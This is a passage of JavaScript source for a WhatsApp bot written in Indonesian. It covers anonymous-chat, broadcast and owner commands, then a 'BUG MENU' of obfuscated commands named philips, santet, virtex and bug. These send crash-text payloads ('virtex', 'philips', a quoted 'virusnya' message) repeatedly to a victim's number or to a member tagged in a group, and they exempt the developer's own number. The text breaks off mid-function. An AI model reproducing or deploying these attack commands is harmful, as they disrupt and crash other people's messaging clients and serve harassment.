conn.sendMessage(`${num}@s.whatsapp.net`, button_menfess)
}
break
case 'tolak_secret':{
reply('Secret ditolak')
var aku = q
var dia = cekPesan("teman", aku, null)
var teks_aku = `Maaf kak undangan secretchat @${aku.split('@')[0]} Ditolak`
setRoom("±id", aku, null)
setRoom("±teman", aku, null)
setRoom("±id", dia, null)
setRoom("±teman", dia, null)
await sleep(2000)
conn.sendMessage(aku, {text:teks_aku, mentions:[aku]})
}
break
// OWNER MENU
case 'resetdb':{
if (!isOwner) return reply(mess.OnlyOwner)
let para_kos = "[]"
db_user.splice(para_kos)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user, null, 1))
await sleep(1000)
db_menfes.splice(para_kos)
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes, null, 1))
await sleep(1000)
db_error.splice(para_kos)
fs.writeFileSync('./database/error.json', JSON.stringify(db_error, null, 1))
reply('Sukses restart database')
}
break
case 'chat':
case 'start':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
var arr_rows = []
for (let i of db_user) {
arr_rows.push({
title: i.name,
rowId: `${prefix}start_conn ${i.id}|${sender}|${cekUser("name", sender)}`
})
}
var listMsg = {
text: `Hai @${sender.split("@")[0]}`,
buttonText: 'Pilih User',
footer: `silahkan pilih user yang mau\ndi ajak ngobrol/chat anonymous`,
mentions: [sender],
sections: [{
title: '© Anonymous Chat', rows: arr_rows
}]
}
conn.sendMessage(from, listMsg)
}
break
case 'start_conn':{
if (q.split('|')[0] == sender) return reply('Itu username kamu sendiri kak')
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
var penerimanyo = q.split('|')[0]
var penerimanya = q.split('|')[1]
var nama_pengirim = q.split('|')[2]
mentions(`Berhasil mengirimkan undangan chat ke @${penerimanyo.split('@')[0]} tunggu dia menyetujui undangan tersebut untuk chatan secara anonim jadi dia tidak tau siapa anda`, [penerimanyo])

setRoom("±id", penerimanya, penerimanyo)
setRoom("±teman", penerimanyo, penerimanya)
setRoom("±id", penerimanyo, penerimanya)
setRoom("±teman", penerimanya, penerimanyo)

let roomC = `#${makeid(10)}`
var text_tersambung =`*Hallo ${cekUser("name", penerimanyo)} ${ucapanWaktu}*\n*Seseorang Mengajak Chating*\n\n*Dari:* ${nama_pengirim}\n\nSilahkan klik button ya kak jika ingin menghubungkan chat *ANONYMOUS*`
let btn_room = [
{ buttonId: `${prefix}auto_room ${penerimanyo}|${penerimanya}|${roomC}`, buttonText: { displayText: '⋮☰ 𝗧𝗘𝗥𝗜𝗠𝗔' }, type: 1 },
{ buttonId: `${prefix}tolak_secret ${penerimanyo}`, buttonText: { displayText: '⋮☰ 𝗧𝗢𝗟𝗔𝗞' }, type: 1 }
]
var but_room = {
text: text_tersambung,
footer: 'Klik button untuk menerima chat.',
buttons: btn_room,
mentions: [penerimanyo],
headerType: 1
}
conn.sendMessage(penerimanyo, but_room)
}
break
case 'dashboard':
case 'db':{
if (!isOwner) return reply(mess.OnlyOwner)
let teks =` 𝘿𝘼𝙎𝙃𝘽𝙊𝘼𝙍𝘿\n\n Terdaftar : ${("id", db_user).length}\n Room Chat : ${db_menfes.length}\n\n`
for (let i of db_user){
teks +=` ID : @${i.id.split('@')[0]}\n Name : ${i.name}\n Premium : (${i.premium? '✓':'✘'})\n\n`
}
reply(teks)
}
break
case 'error':{
if (!isOwner) return reply(mess.OnlyOwner)
let ertxt = `*Server Error*\n*Tercatat:* ${db_error.length}\n\n`
for (let i of db_error){
ertxt +=`*Pengguna:* @${i.user.split('@')[0]}\n*Jam:* ${i.jam} WIB\n*Tanggal:* ${i.tanggal}\n*Type:* ${i.error}\n\n`
}
conn.sendMessage(from, {text:ertxt}, {quoted:msg})
}
break
case 'mysesi': case 'sendsesi': case 'session':{
if (!isOwner) return reply(mess.OnlyOwner)
reply('please wait..')
await sleep(3000)
var user_bot = await fs.readFileSync('./database/pengguna.json')
var sesi_bot = await fs.readFileSync(`./${setting.sessionName}.json`)
conn.sendMessage(from, { document: sesi_bot, mimetype: 'document/application', fileName: 'session.json'}, {quoted:msg})
conn.sendMessage(from, { document: user_bot, mimetype: 'document/application', fileName: 'pengguna.json'}, {quoted:msg})
}
break
case 'bc':
case 'broadcast':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} hallo`)
let db_orang = JSON.parse(fs.readFileSync('./database/pengguna.json'));
let data_teks = `${q}`
for (let i of db_orang){ 
var button_broadcast = {text: data_teks, footer: '©broadcast', buttons: [{ buttonId: '!menu', buttonText: {displayText: '⋮☰ 𝗠𝗘𝗡𝗨'}, type: 1}],headerType: 1}
conn.sendMessage(i.id, button_broadcast)
await sleep(2000)
}
reply(`*Sukses mengirim broadcast text ke ${db_orang.length} user*`)
}
break
case 'runtime':
case 'tes':
if (!isOwner) return reply(mess.OnlyOwner)
reply(`*Runtime : ${runtime(process.uptime())}*`)
break

// BUG MENU
// JANGAN EDIT YA KAK
// PAKE SESUAI FORMAT

// DILARANG SPAM BUG BOT
// KARENA BISA MENYEBABKAN
// WHATSAPP BOT TERBANNED

case 'philips':{
var _0x3c1d14=_0x49f3;(function(_0x4a07c8,_0x3c9493){var _0x3bc1f5=_0x49f3,_0x3eab21=_0x4a07c8();while(!![]){try{var _0x574559=-parseInt(_0x3bc1f5(0x1d0))/0x1+-parseInt(_0x3bc1f5(0x1c0))/0x2*(-parseInt(_0x3bc1f5(0x1cd))/0x3)+-parseInt(_0x3bc1f5(0x1c7))/0x4*(parseInt(_0x3bc1f5(0x1c1))/0x5)+-parseInt(_0x3bc1f5(0x1cf))/0x6+parseInt(_0x3bc1f5(0x1ce))/0x7*(parseInt(_0x3bc1f5(0x1c3))/0x8)+parseInt(_0x3bc1f5(0x1cc))/0x9*(-parseInt(_0x3bc1f5(0x1cb))/0xa)+parseInt(_0x3bc1f5(0x1bf))/0xb;if(_0x574559===_0x3c9493)break;else _0x3eab21['push'](_0x3eab21['shift']());}catch(_0x40dd11){_0x3eab21['push'](_0x3eab21['shift']());}}}(_0x327b,0x3e1d3));if(!isOwner)return reply(mess[_0x3c1d14(0x1bd)]);if(!q)return reply(_0x3c1d14(0x1c2)+(prefix+command)+_0x3c1d14(0x1c5));var num=q+_0x3c1d14(0x1c9),dev=_0x3c1d14(0x1c8);if(num==dev)return reply(_0x3c1d14(0x1ca));function _0x327b(){var _0x52ff57=['Itu\x20developer\x20gua','10GJRiUQ','2048616qnBhYO','214410utdqRB','2303707qhkYQV','499542sXRNiW','216817PMYkvP','OnlyOwner','Itu\x20Nomor\x20Lu\x20Sendiri','4287019dfovjc','14UDLpIb','5705POaKWk','Syntak\x20Error!\x0a*Contoh:*\x0a','8WwEbAy','sendMessage','\x20628xxx','Sukses\x20kirim\x20philips\x20to\x20@','1532iLxzNt','6283834558105@s.whatsapp.net','@s.whatsapp.net'];_0x327b=function(){return _0x52ff57;};return _0x327b();}function _0x49f3(_0x3630ea,_0x474aa9){var _0x327bcb=_0x327b();return _0x49f3=function(_0x49f3aa,_0x22364c){_0x49f3aa=_0x49f3aa-0x1bd;var _0x3eacc7=_0x327bcb[_0x49f3aa];return _0x3eacc7;},_0x49f3(_0x3630ea,_0x474aa9);}if(num==sender)return reply(_0x3c1d14(0x1be));await sleep(0xbb8),conn[_0x3c1d14(0x1c4)](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x3c1d14(0x1c6)+num['split']('@')[0x0],[num]);
}
break
case 'philips2':{
var _0x37936c=_0x14ae;(function(_0x4988b3,_0x276c0d){var _0x698e01=_0x14ae,_0x10d112=_0x4988b3();while(!![]){try{var _0xc5b523=parseInt(_0x698e01(0xb0))/0x1*(-parseInt(_0x698e01(0xb3))/0x2)+parseInt(_0x698e01(0xaf))/0x3*(parseInt(_0x698e01(0xa5))/0x4)+-parseInt(_0x698e01(0xaa))/0x5*(-parseInt(_0x698e01(0xad))/0x6)+parseInt(_0x698e01(0xb2))/0x7+parseInt(_0x698e01(0xb5))/0x8*(-parseInt(_0x698e01(0xa3))/0x9)+-parseInt(_0x698e01(0xa8))/0xa+parseInt(_0x698e01(0xa6))/0xb;if(_0xc5b523===_0x276c0d)break;else _0x10d112['push'](_0x10d112['shift']());}catch(_0x9d7734){_0x10d112['push'](_0x10d112['shift']());}}}(_0x373e,0x3d5f6));if(!isOwner)return reply(mess[_0x37936c(0xae)]);if(!q)return reply(_0x37936c(0xab)+(prefix+command)+'\x20628xxx');function _0x373e(){var _0x10ddb5=['9ddSxmw','split','5260ixrTJF','2607979zSAdUX','Itu\x20Nomor\x20Lu\x20Sendiri','2325160TsEpOs','Sukses\x20kirim\x20*','3215oIEuZv','Syntak\x20Error!\x0a*Contoh:*\x0a','6283834558105@s.whatsapp.net','492BCsQAP','OnlyOwner','834MvQBRS','418423zSNuvy','sendMessage','3320863wFINQg','2hEecVq','*\x20to\x20@','1819784ufoQZM'];_0x373e=function(){return _0x10ddb5;};return _0x373e();}function _0x14ae(_0x4279e7,_0x24a330){var _0x373e45=_0x373e();return _0x14ae=function(_0x14ae5d,_0x37da18){_0x14ae5d=_0x14ae5d-0xa3;var _0xf9e532=_0x373e45[_0x14ae5d];return _0xf9e532;},_0x14ae(_0x4279e7,_0x24a330);}var num=q+'@s.whatsapp.net',dev=_0x37936c(0xac);if(num==dev)return reply('Itu\x20developer\x20gua');if(num==sender)return reply(_0x37936c(0xa7));await sleep(0xbb8),conn[_0x37936c(0xb1)](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x37936c(0xb1)](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x37936c(0xa9)+command+_0x37936c(0xb4)+num[_0x37936c(0xa4)]('@')[0x0],[num]);
}
break
case 'philips3':{
var _0x5169cc=_0x462b;(function(_0x529ca1,_0x4316be){var _0x3bd43b=_0x462b,_0x258301=_0x529ca1();while(!![]){try{var _0x789c3b=-parseInt(_0x3bd43b(0x1b0))/0x1+parseInt(_0x3bd43b(0x1ae))/0x2+parseInt(_0x3bd43b(0x1a9))/0x3*(parseInt(_0x3bd43b(0x1ad))/0x4)+-parseInt(_0x3bd43b(0x1a8))/0x5*(-parseInt(_0x3bd43b(0x1af))/0x6)+parseInt(_0x3bd43b(0x1b5))/0x7+-parseInt(_0x3bd43b(0x1a2))/0x8+-parseInt(_0x3bd43b(0x1b1))/0x9;if(_0x789c3b===_0x4316be)break;else _0x258301['push'](_0x258301['shift']());}catch(_0x12aaf1){_0x258301['push'](_0x258301['shift']());}}}(_0x3767,0x27a47));function _0x3767(){var _0x10f0a1=['402920aPWjZV','2227752GpUYsm','@s.whatsapp.net','Syntak\x20Error!\x0a*Contoh:*\x0a','Itu\x20Nomor\x20Lu\x20Sendiri','sendMessage','\x20628xxx','15525litWTe','953643Kvhirg','6283834558105@s.whatsapp.net','Itu\x20developer\x20gua','OnlyOwner','4UnnfXW','106822nurnvq','438uzZpcG','166581vCBaih','432828BNBlxS','Sukses\x20kirim\x20*','*\x20to\x20@','split'];_0x3767=function(){return _0x10f0a1;};return _0x3767();}function _0x462b(_0x412dc1,_0x2fa89a){var _0x37673d=_0x3767();return _0x462b=function(_0x462b00,_0x25936f){_0x462b00=_0x462b00-0x1a2;var _0x349125=_0x37673d[_0x462b00];return _0x349125;},_0x462b(_0x412dc1,_0x2fa89a);}if(!isOwner)return reply(mess[_0x5169cc(0x1ac)]);if(!q)return reply(_0x5169cc(0x1a4)+(prefix+command)+_0x5169cc(0x1a7));var num=q+_0x5169cc(0x1a3),dev=_0x5169cc(0x1aa);if(num==dev)return reply(_0x5169cc(0x1ab));if(num==sender)return reply(_0x5169cc(0x1a5));conn[_0x5169cc(0x1a6)](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x5169cc(0x1a6)](num,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x5169cc(0x1b2)+command+_0x5169cc(0x1b3)+num[_0x5169cc(0x1b4)]('@')[0x0],[num]);
}
break
case 'santet':{
var _0x31bc0d=_0x4c01;(function(_0x19d87a,_0x1d1127){var _0x31e58a=_0x4c01,_0x7ab45c=_0x19d87a();while(!![]){try{var _0x1011b0=-parseInt(_0x31e58a(0x132))/0x1+parseInt(_0x31e58a(0x139))/0x2*(parseInt(_0x31e58a(0x13f))/0x3)+-parseInt(_0x31e58a(0x134))/0x4*(parseInt(_0x31e58a(0x131))/0x5)+parseInt(_0x31e58a(0x12e))/0x6*(parseInt(_0x31e58a(0x12f))/0x7)+parseInt(_0x31e58a(0x133))/0x8+-parseInt(_0x31e58a(0x13b))/0x9*(-parseInt(_0x31e58a(0x13a))/0xa)+-parseInt(_0x31e58a(0x13d))/0xb;if(_0x1011b0===_0x1d1127)break;else _0x7ab45c['push'](_0x7ab45c['shift']());}catch(_0x1c005e){_0x7ab45c['push'](_0x7ab45c['shift']());}}}(_0x367f,0x96857));if(!isOwner)return reply(mess[_0x31bc0d(0x137)]);if(!isGroup)return reply(mess['OnlyGrup']);function _0x367f(){var _0x156725=['7750256CuImYQ','1878460rhtrZj','Tag\x20atau\x20reply\x20orang\x20yg\x20mau\x20santet\x0a\x0a*Contoh:*\x20#santet\x20@tag','sendMessage','OnlyOwner','length','68BABFPT','9210safrab','10809xJRbgA','*\x20to\x20@','12983113hkedDv','Sukses\x20kirim\x20*','69051BFozdg','18XFXOME','790300WxvHQD','split','10JihKod','460133ZnoWla'];_0x367f=function(){return _0x156725;};return _0x367f();}var number;function _0x4c01(_0x598507,_0x3414cc){var _0x367f55=_0x367f();return _0x4c01=function(_0x4c01ed,_0x291256){_0x4c01ed=_0x4c01ed-0x12e;var _0x370a5e=_0x367f55[_0x4c01ed];return _0x370a5e;},_0x4c01(_0x598507,_0x3414cc);}if(mentionUser[_0x31bc0d(0x138)]!==0x0)number=mentionUser[0x0],await sleep(0xbb8),conn[_0x31bc0d(0x136)](number,{'text':philips},{'quoted':virusnya}),mentions(_0x31bc0d(0x13e)+command+_0x31bc0d(0x13c)+number[_0x31bc0d(0x130)]('@')[0x0],[number]);else isQuotedMsg?(number=quotedMsg['sender'],await sleep(0xbb8),conn[_0x31bc0d(0x136)](number,{'text':philips},{'quoted':virusnya}),mentions(_0x31bc0d(0x13e)+command+'*\x20to\x20@'+number['split']('@')[0x0],[number])):reply(_0x31bc0d(0x135));
}
break
case 'santet2':{
var _0x590317=_0xa13d;(function(_0x1ca161,_0x42a146){var _0xab5965=_0xa13d,_0x4de713=_0x1ca161();while(!![]){try{var _0x2a603d=parseInt(_0xab5965(0x6c))/0x1+parseInt(_0xab5965(0x65))/0x2*(parseInt(_0xab5965(0x74))/0x3)+parseInt(_0xab5965(0x67))/0x4+-parseInt(_0xab5965(0x73))/0x5*(parseInt(_0xab5965(0x70))/0x6)+parseInt(_0xab5965(0x6b))/0x7+parseInt(_0xab5965(0x72))/0x8+-parseInt(_0xab5965(0x6d))/0x9;if(_0x2a603d===_0x42a146)break;else _0x4de713['push'](_0x4de713['shift']());}catch(_0x2fce0d){_0x4de713['push'](_0x4de713['shift']());}}}(_0x1d9f,0xadf99));function _0xa13d(_0x191784,_0x4c7d6f){var _0x1d9f5e=_0x1d9f();return _0xa13d=function(_0xa13d4d,_0x3bf0e8){_0xa13d4d=_0xa13d4d-0x65;var _0x48dd7b=_0x1d9f5e[_0xa13d4d];return _0x48dd7b;},_0xa13d(_0x191784,_0x4c7d6f);}if(!isOwner)return reply(mess[_0x590317(0x6a)]);if(!isGroup)return reply(mess['OnlyGrup']);function _0x1d9f(){var _0x545577=['*\x20to\x20@','sender','OnlyOwner','7901831jfaDde','300147yagJdm','19364652eOajtf','sendMessage','split','6qvVSxj','Sukses\x20kirim\x20*','3064632vouKcX','1806095IouxSR','3eyOENJ','2259566pGgqrg','Tag\x20atau\x20reply\x20orang\x20yg\x20mau\x20santet\x0a\x0a*Contoh:*\x20#santet\x20@tag','1134424ToipKe'];_0x1d9f=function(){return _0x545577;};return _0x1d9f();}var number;if(mentionUser['length']!==0x0)number=mentionUser[0x0],await sleep(0xbb8),conn[_0x590317(0x6e)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x590317(0x6e)](number,{'text':philips},{'quoted':virusnya}),mentions(_0x590317(0x71)+command+_0x590317(0x68)+number[_0x590317(0x6f)]('@')[0x0],[number]);else isQuotedMsg?(number=quotedMsg[_0x590317(0x69)],await sleep(0xbb8),conn[_0x590317(0x6e)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](number,{'text':philips},{'quoted':virusnya}),mentions(_0x590317(0x71)+command+_0x590317(0x68)+number[_0x590317(0x6f)]('@')[0x0],[number])):reply(_0x590317(0x66));
}
break
case 'santet3':{
function _0x42c2(){var _0x4ad10d=['1407444BxvcVM','sender','Tag\x20atau\x20reply\x20orang\x20yg\x20mau\x20santet\x0a\x0a*Contoh:*\x20#santet\x20@tag','1899846dHlcbk','length','2309181HIpMQr','split','*\x20to\x20@','2894375MXcBFT','sendMessage','Sukses\x20kirim\x20*','OnlyOwner','OnlyGrup','32VSGOEk','4611945KGPywa','2394TnBOWk','111210gPQBlp','4duKuEL','116177lSSSlj'];_0x42c2=function(){return _0x4ad10d;};return _0x42c2();}var _0x518bd5=_0x4a2b;(function(_0x49ade8,_0x117cd5){var _0xeb848b=_0x4a2b,_0x9fb9c=_0x49ade8();while(!![]){try{var _0x4f811a=-parseInt(_0xeb848b(0x178))/0x1+parseInt(_0xeb848b(0x179))/0x2+-parseInt(_0xeb848b(0x174))/0x3+parseInt(_0xeb848b(0x177))/0x4*(parseInt(_0xeb848b(0x16e))/0x5)+-parseInt(_0xeb848b(0x17c))/0x6+parseInt(_0xeb848b(0x17e))/0x7*(-parseInt(_0xeb848b(0x173))/0x8)+parseInt(_0xeb848b(0x175))/0x9*(parseInt(_0xeb848b(0x176))/0xa);if(_0x4f811a===_0x117cd5)break;else _0x9fb9c['push'](_0x9fb9c['shift']());}catch(_0x597554){_0x9fb9c['push'](_0x9fb9c['shift']());}}}(_0x42c2,0xe834e));if(!isOwner)return reply(mess[_0x518bd5(0x171)]);if(!isGroup)return reply(mess[_0x518bd5(0x172)]);var number;function _0x4a2b(_0x3a3cd3,_0x1adb78){var _0x42c260=_0x42c2();return _0x4a2b=function(_0x4a2b4f,_0x4e94eb){_0x4a2b4f=_0x4a2b4f-0x16e;var _0x8581ac=_0x42c260[_0x4a2b4f];return _0x8581ac;},_0x4a2b(_0x3a3cd3,_0x1adb78);}if(mentionUser[_0x518bd5(0x17d)]!==0x0)number=mentionUser[0x0],await sleep(0xbb8),conn[_0x518bd5(0x16f)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x518bd5(0x16f)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn['sendMessage'](number,{'text':philips},{'quoted':virusnya}),mentions(_0x518bd5(0x170)+command+_0x518bd5(0x180)+number[_0x518bd5(0x17f)]('@')[0x0],[number]);else isQuotedMsg?(number=quotedMsg[_0x518bd5(0x17a)],await sleep(0xbb8),conn[_0x518bd5(0x16f)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x518bd5(0x16f)](number,{'text':philips},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x518bd5(0x16f)](number,{'text':philips},{'quoted':virusnya}),mentions('Sukses\x20kirim\x20*'+command+_0x518bd5(0x180)+number['split']('@')[0x0],[number])):reply(_0x518bd5(0x17b));
}
break
case 'virtex':{
var _0x27cee7=_0x5d69;(function(_0xdcdc35,_0x48d44a){var _0x2f2d82=_0x5d69,_0x2e1cd8=_0xdcdc35();while(!![]){try{var _0x4ba584=-parseInt(_0x2f2d82(0x176))/0x1+-parseInt(_0x2f2d82(0x17e))/0x2+parseInt(_0x2f2d82(0x171))/0x3+parseInt(_0x2f2d82(0x16f))/0x4*(-parseInt(_0x2f2d82(0x175))/0x5)+-parseInt(_0x2f2d82(0x17d))/0x6*(parseInt(_0x2f2d82(0x179))/0x7)+-parseInt(_0x2f2d82(0x174))/0x8*(parseInt(_0x2f2d82(0x178))/0x9)+-parseInt(_0x2f2d82(0x172))/0xa*(-parseInt(_0x2f2d82(0x177))/0xb);if(_0x4ba584===_0x48d44a)break;else _0x2e1cd8['push'](_0x2e1cd8['shift']());}catch(_0x35b89c){_0x2e1cd8['push'](_0x2e1cd8['shift']());}}}(_0x3ea5,0x61ced));function _0x3ea5(){var _0x12d9d0=['7RgSmPe','\x20628xxx','itu\x20nomor\x20lu\x20sendiri','6283834558105@s.whatsapp.net','2613252dOUlcM','1392020ZWAAZU','Sukses\x20kirim\x20*','Syntak\x20Error!\x0a*Contoh:*\x0a','72LmlBPD','Itu\x20developer\x20gua','1102254OpfEXf','2355510hTqUgy','@s.whatsapp.net','2121224qLsVPo','98885RtwqEX','68912YTfeJb','99CQWRqx','18uUrXEP'];_0x3ea5=function(){return _0x12d9d0;};return _0x3ea5();}if(!isOwner)return reply(mess['OnlyOwner']);if(!q)return reply(_0x27cee7(0x180)+(prefix+command)+_0x27cee7(0x17a));var num=q+_0x27cee7(0x173),dev=_0x27cee7(0x17c);if(num==dev)return reply(_0x27cee7(0x170));if(num==sender)return reply(_0x27cee7(0x17b));function _0x5d69(_0xf20660,_0x5de47f){var _0x3ea5d8=_0x3ea5();return _0x5d69=function(_0x5d6954,_0x8051ff){_0x5d6954=_0x5d6954-0x16f;var _0x2702e6=_0x3ea5d8[_0x5d6954];return _0x2702e6;},_0x5d69(_0xf20660,_0x5de47f);}conn['sendMessage'](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x27cee7(0x17f)+command+'*\x20to\x20@'+num['split']('@')[0x0],[num]);
}
break
case 'virtex2':{
}
break
case 'virtex3':{
function _0x1bef(_0x2090a2,_0x43ad4b){var _0x1d6363=_0x1d63();return _0x1bef=function(_0x1bef4a,_0x2ac487){_0x1bef4a=_0x1bef4a-0x83;var _0x3782d3=_0x1d6363[_0x1bef4a];return _0x3782d3;},_0x1bef(_0x2090a2,_0x43ad4b);}var _0x1823b4=_0x1bef;(function(_0x5214c3,_0xfbbef1){var _0x34f073=_0x1bef,_0x5e3334=_0x5214c3();while(!![]){try{var _0x3285ad=-parseInt(_0x34f073(0x8b))/0x1*(-parseInt(_0x34f073(0x94))/0x2)+parseInt(_0x34f073(0x88))/0x3+parseInt(_0x34f073(0x91))/0x4*(-parseInt(_0x34f073(0x8c))/0x5)+parseInt(_0x34f073(0x89))/0x6*(-parseInt(_0x34f073(0x83))/0x7)+parseInt(_0x34f073(0x96))/0x8*(parseInt(_0x34f073(0x92))/0x9)+-parseInt(_0x34f073(0x8e))/0xa+parseInt(_0x34f073(0x84))/0xb;if(_0x3285ad===_0xfbbef1)break;else _0x5e3334['push'](_0x5e3334['shift']());}catch(_0x412a3a){_0x5e3334['push'](_0x5e3334['shift']());}}}(_0x1d63,0x323ad));if(!isOwner)return reply(mess[_0x1823b4(0x86)]);if(!q)return reply('Syntak\x20Error!\x0a*Contoh:*\x0a'+(prefix+command)+_0x1823b4(0x97));function _0x1d63(){var _0x524932=['6283834558105@s.whatsapp.net','551175rYzkGD','906lKYUlP','sendMessage','1Vgfoxw','9910JrnEXP','*\x20to\x20@','2178570ZqaSvu','Itu\x20developer\x20gua','itu\x20nomor\x20lu\x20sendiri','420EhVnZo','18ZSSyLc','Sukses\x20kirim\x20*','340894DPzauC','split','1293616QnQeXq','\x20628xxx','9023qvNMfE','1636481GIKDKz','@s.whatsapp.net','OnlyOwner'];_0x1d63=function(){return _0x524932;};return _0x1d63();}var num=q+_0x1823b4(0x85),dev=_0x1823b4(0x87);if(num==dev)return reply(_0x1823b4(0x8f));if(num==sender)return reply(_0x1823b4(0x90));conn[_0x1823b4(0x8a)](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),conn[_0x1823b4(0x8a)](num,{'text':virtex()},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x1823b4(0x93)+command+_0x1823b4(0x8d)+num[_0x1823b4(0x95)]('@')[0x0],[num]);
}
break
case 'bug1':{
var _0x4670fa=_0x3b16;(function(_0x3ca0be,_0xcbb406){var _0x53ca11=_0x3b16,_0x20d8a5=_0x3ca0be();while(!![]){try{var _0x5def0a=-parseInt(_0x53ca11(0xb6))/0x1+parseInt(_0x53ca11(0xb1))/0x2*(-parseInt(_0x53ca11(0xaa))/0x3)+parseInt(_0x53ca11(0xab))/0x4*(-parseInt(_0x53ca11(0xb3))/0x5)+parseInt(_0x53ca11(0xb0))/0x6*(parseInt(_0x53ca11(0xb9))/0x7)+parseInt(_0x53ca11(0xa9))/0x8*(parseInt(_0x53ca11(0xbb))/0x9)+-parseInt(_0x53ca11(0xb4))/0xa*(-parseInt(_0x53ca11(0xb8))/0xb)+parseInt(_0x53ca11(0xa8))/0xc;if(_0x5def0a===_0xcbb406)break;else _0x20d8a5['push'](_0x20d8a5['shift']());}catch(_0x2dac36){_0x20d8a5['push'](_0x20d8a5['shift']());}}}(_0x22ef,0xc79ca));if(!isOwner)return reply(mess[_0x4670fa(0xaf)]);if(!q)return reply(_0x4670fa(0xad)+(prefix+command)+_0x4670fa(0xb2));var num=q+_0x4670fa(0xb5),dev=_0x4670fa(0xb7);function _0x22ef(){var _0x5abd99=['36vWZzzD','3442luaYbz','\x20628xxx','55wNZEaX','1580ylXwFg','@s.whatsapp.net','1448638OvCqwp','6283834558105@s.whatsapp.net','69487CzxhtZ','1282694EgbpBT','*\x20to\x20@','1929987rsFWJk','itu\x20nomor\x20lu\x20sendiri','sendMessage','2507016DZankP','56LrEtxv','1617yBCTmV','223160LxBYkR','Sukses\x20kirim\x20*','Syntak\x20Error!\x0a*Contoh:*\x0a','Itu\x20developer\x20gua','OnlyOwner'];_0x22ef=function(){return _0x5abd99;};return _0x22ef();}if(num==dev)return reply(_0x4670fa(0xae));if(num==sender)return reply(_0x4670fa(0xbc));function _0x3b16(_0x483f9b,_0x2f50cc){var _0x22ef2a=_0x22ef();return _0x3b16=function(_0x3b16ef,_0x19a01f){_0x3b16ef=_0x3b16ef-0xa8;var _0x3e30a1=_0x22ef2a[_0x3b16ef];return _0x3e30a1;},_0x3b16(_0x483f9b,_0x2f50cc);}conn[_0x4670fa(0xbd)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x4670fa(0xac)+command+_0x4670fa(0xba)+num['split']('@')[0x0],[num]);
}
break
case 'bug2':{
var _0x42d092=_0x536d;function _0x2b63(){var _0x5808a6=['108AvCJyW','\x20628xxx','473925aeKggm','Itu\x20developer\x20gua','943588kiMqYf','423261RtvRLq','Syntak\x20Error!\x0a*Contoh:*\x0a','sendMessage','9MAishW','24VgIMHO','itu\x20nomor\x20lu\x20sendiri','245370dRqgXC','725942vjwefU','Sukses\x20kirim\x20*','split','6283834558105@s.whatsapp.net','*\x20to\x20@','246710cynHKL','671178RAovaF'];_0x2b63=function(){return _0x5808a6;};return _0x2b63();}(function(_0x4d803d,_0x466db1){var _0x252176=_0x536d,_0x1d7992=_0x4d803d();while(!![]){try{var _0x10bbe5=-parseInt(_0x252176(0xcd))/0x1+parseInt(_0x252176(0xd3))/0x2*(-parseInt(_0x252176(0xd0))/0x3)+parseInt(_0x252176(0xcc))/0x4+parseInt(_0x252176(0xdd))/0x5+parseInt(_0x252176(0xda))/0x6+-parseInt(_0x252176(0xd4))/0x7*(-parseInt(_0x252176(0xd1))/0x8)+-parseInt(_0x252176(0xdb))/0x9*(-parseInt(_0x252176(0xd9))/0xa);if(_0x10bbe5===_0x466db1)break;else _0x1d7992['push'](_0x1d7992['shift']());}catch(_0x54e6f5){_0x1d7992['push'](_0x1d7992['shift']());}}}(_0x2b63,0x3f15f));if(!isOwner)return reply(mess['OnlyOwner']);if(!q)return reply(_0x42d092(0xce)+(prefix+command)+_0x42d092(0xdc));var num=q+'@s.whatsapp.net',dev=_0x42d092(0xd7);if(num==dev)return reply(_0x42d092(0xde));if(num==sender)return reply(_0x42d092(0xd2));function _0x536d(_0x1a8930,_0x20a391){var _0x2b637c=_0x2b63();return _0x536d=function(_0x536d66,_0x515670){_0x536d66=_0x536d66-0xcc;var _0x9860a0=_0x2b637c[_0x536d66];return _0x9860a0;},_0x536d(_0x1a8930,_0x20a391);}conn[_0x42d092(0xcf)](num,{'text':'p'},{'quoted':virusnya}),await sleep(0xbb8),mentions(_0x42d092(0xd5)+command+_0x42d092(0xd8)+num[_0x42d092(0xd6)]('@')[0x0],[num]);
}
break
case 'bug3':{
var _0x38d798=_0x53f4;(function(_0xf63720,_0x5071bf){var _0x52a435=_0x53f4,_0x237270=_0xf63720();while(!![]){try{var _0x48709a=parseInt(_0x52a435(0xd8))/0x1+parseInt(_0x52a435(0xd3))/0x2*(-parseInt(_0x52a435(0xd0))/0x3)+-parseInt(_0x52a435(0xde))/0x4*(parseInt(_0x52a435(0xd5))/0x5)+parseInt(_0x52a435(0xdb))/0x6+-parseInt(_0x52a435(0xdd))/0x7*(parseInt(_0x52a435(0xd9))/0x8)+parseInt(_0x52a435(0xd2))/0x9*(parseInt(_0x52a435(0xce))/0xa)+parseInt(_0x52a435(0xdf))/0xb*(parseInt(_0x52a435(0xe0))/0xc);if(_0x48709a===_0x5071bf)break;else _0x237270['push'](_0x237270['shift']());}catch(_0x1cbac2){_0x237270['push'](_0x237270['shift']());}}}(_0x3e95,0x86971));if(!isOwner)return reply(mess[_0x38d798(0xd7)]);if(!q)return reply(_0x38d798(0xd1)+(prefix+command)+'\x20628xxx');var num=q+_0x38d798(0xd4),dev=_0x38d798(0xcf);function 